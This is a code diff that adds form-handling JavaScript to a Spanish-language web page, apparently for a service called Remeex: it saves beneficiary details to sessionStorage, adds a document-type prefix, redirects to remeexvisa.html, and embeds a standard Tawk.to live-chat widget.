+    nationalitySelect.addEventListener("change", guardarDatosAutomaticamente);
+    docNumberInput.addEventListener("input", guardarDatosAutomaticamente);
+    birthDateInput.addEventListener("input", guardarDatosAutomaticamente);
+    isAdultCheckbox.addEventListener("change", guardarDatosAutomaticamente);
+  });
+
+  function guardarDatosAutomaticamente() {
+    const cardType = cardMethodSelect.value;
+    const cardBrand = cardBrandSelect.value;
+    const fullName = fullNameInput.value;
+    const phonePrefix = phonePrefixSelect.value;
+    const phoneNumber = phoneNumberInput.value;
+    const docType = docTypeSelect.value;
+    const nationality = nationalitySelect.value;
+    const docNumber = docNumberInput.value;
+    const birthDate = birthDateInput.value;
+    const isAdult = isAdultCheckbox.checked;
+
+    const data = {
+      cardType,
+      cardBrand,
+      fullName,
+      telefono: `${phonePrefix}-${phoneNumber}`,
+      docType,
+      nationality,
+      docNumber,
+      birthDate,
+      isAdult,
+    };
+    sessionStorage.setItem('beneficiaryData', JSON.stringify(data));
+  }
+
+  function continueRemeex() {
+    const storedData = JSON.parse(sessionStorage.getItem('beneficiaryData')) || {};
+
+    let docPrefix = "";
+    if (storedData.docType === "Cédula de Identidad") docPrefix = "V-";
+    else if (storedData.docType === "Pasaporte Vigente") docPrefix = "P-";
+    else if (storedData.docType === "Licencia de Conducir") docPrefix = "L-";
+
+    const datosRemeex = {
+      cardType: storedData.cardType || "",
+      cardBrand: storedData.cardBrand || "",
+      fullName: storedData.fullName || "",
+      telefono: storedData.telefono || "",
+      docType: storedData.docType || "",
+      nationality: storedData.nationality || "",
+      docNumberCompleto: docPrefix + (storedData.docNumber || ""),
+      birthDate: storedData.birthDate || "",
+      isAdult: !!storedData.isAdult
+    };
+
+    if (datosRemeex.fullName) {
+      sessionStorage.setItem("userName", datosRemeex.fullName);
+    }
+    sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
+    sessionStorage.removeItem("beneficiaryData");
+    isRedirecting = true;
+    window.location.href = "remeexvisa.html";
+  }
+</script>
+
+<!-- Integración de Tawk.to para soporte en vivo -->
+<script>
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+    var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+  })();
+</script>
+
+</body>
+</html>
